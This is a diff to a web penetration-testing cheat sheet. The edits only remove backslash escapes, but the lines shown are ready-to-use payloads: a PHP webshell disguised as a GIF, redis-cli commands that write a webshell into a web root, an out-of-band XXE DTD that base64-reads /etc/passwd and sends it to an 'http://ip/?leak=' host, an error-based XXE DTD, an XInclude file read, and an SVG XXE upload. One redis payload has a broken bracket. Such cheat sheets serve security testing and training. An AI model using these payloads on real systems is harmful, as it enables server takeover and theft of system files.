@@ -724,7 +724,7 @@ preg_match('/^\.\/okay\/.+$/', $_GET['file'])
 
 -> gif
 
-`echo 'GIF8\<?php system($_GET["cmd"]); ?>' > ok.gif`  
+`echo 'GIF8<?php system($_GET["cmd"]); ?>' > ok.gif`  
 https://github.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/blob/main/codes/webshells/shell.gif  
 
 -> Zip
@@ -839,7 +839,7 @@ https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester
 `redis-cli -h ip`  
 `config set dir /var/www/html`  
 `config set dbfilename ok.php`  
-`set test "\<?php system($_GET['okay'); ?>"`  
+`set test "<?php system($_GET['okay'); ?>"`  
 `save`
 
 #### Study
@@ -1171,7 +1171,7 @@ http://10.10.57.49:9200/_search?pretty=true&q=pass
 -> Part 2 (evil.dtd)
 ```
 <!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=file:///etc/passwd">  
-<!ENTITY % int "\<!ENTITY exfil SYSTEM 'http://ip/?leak=%file;'>">  
+<!ENTITY % int "<!ENTITY exfil SYSTEM 'http://ip/?leak=%file;'>">  
 ```  
 https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/main/codes/xxe/evil.dtd
 
@@ -1189,18 +1189,18 @@ https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester
 
 ```
 <!ENTITY % file SYSTEM "file:///etc/passwd">
-<!ENTITY % payload "\<!ENTITY &#37; remote SYSTEM 'file:///idonotexist/%file;'>">
+<!ENTITY % payload "<!ENTITY &#37; remote SYSTEM 'file:///idonotexist/%file;'>">
 https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/main/codes/xxe/error.dtd  
 
 ```
   
 ### XInclude to retrieve files with dtd file
-`<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/>\</foo>`
+`<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>`
 
 ### Image file upload
 
 ```
-<?xml version="1.0" standalone="yes"?>\<!DOCTYPE test [ \<!ENTITY xxe SYSTEM "file:///etc/hostname" > ]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">\<text font-size="16" x="0" y="16">&xxe;</text></svg>
+<?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg>
 ```  
 https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/main/codes/xxe/evil.svg
 
